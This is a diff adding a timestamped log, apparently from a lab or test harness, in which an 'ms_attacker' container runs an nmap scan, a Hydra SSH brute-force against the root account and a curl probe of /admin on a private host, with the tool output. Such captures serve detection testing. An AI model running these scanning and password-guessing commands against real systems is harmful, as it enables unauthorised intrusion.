@@ -1,0 +1,28 @@
+[2026-04-27T07:00:58Z] attacks capture start
+$ docker exec ms_attacker nmap -Pn -sS -p 80 --max-retries 1 10.201.0.20 || true; docker exec ms_attacker hydra -l root -P /tmp/wordlist.txt -t 2 -f ssh://10.201.0.20 || true; docker exec ms_attacker curl -m 5 -sS 'http://10.201.0.20/admin' || true
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-27 07:00 UTC
+Nmap scan report for 10.201.0.20
+Host is up (0.00017s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 07:00:59
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 1000 login tries (l:1/p:1000), ~500 tries per task
+[DATA] attacking ssh://10.201.0.20:22/
+[STATUS] 22.00 tries/min, 22 tries in 00:01h, 978 to do in 00:45h, 2 active
+[STATUS] 14.00 tries/min, 42 tries in 00:03h, 958 to do in 01:09h, 2 active
+[STATUS] 14.29 tries/min, 100 tries in 00:07h, 900 to do in 01:04h, 2 active
+[STATUS] 13.50 tries/min, 162 tries in 00:12h, 838 to do in 01:03h, 2 active
+[STATUS] 13.47 tries/min, 229 tries in 00:17h, 771 to do in 00:58h, 2 active
+[STATUS] 13.27 tries/min, 292 tries in 00:22h, 708 to do in 00:54h, 2 active
+[STATUS] 13.41 tries/min, 362 tries in 00:27h, 638 to do in 00:48h, 2 active
+[STATUS] 13.28 tries/min, 425 tries in 00:32h, 575 to do in 00:44h, 2 active
+[STATUS] 13.30 tries/min, 492 tries in 00:37h, 508 to do in 00:39h, 2 active
+[STATUS] 13.19 tries/min, 554 tries in 00:42h, 446 to do in 00:34h, 2 active
+[STATUS] 13.23 tries/min, 622 tries in 00:47h, 378 to do in 00:29h, 2 active
+exit_code=0
+[2026-04-27T07:51:38Z] attacks capture end
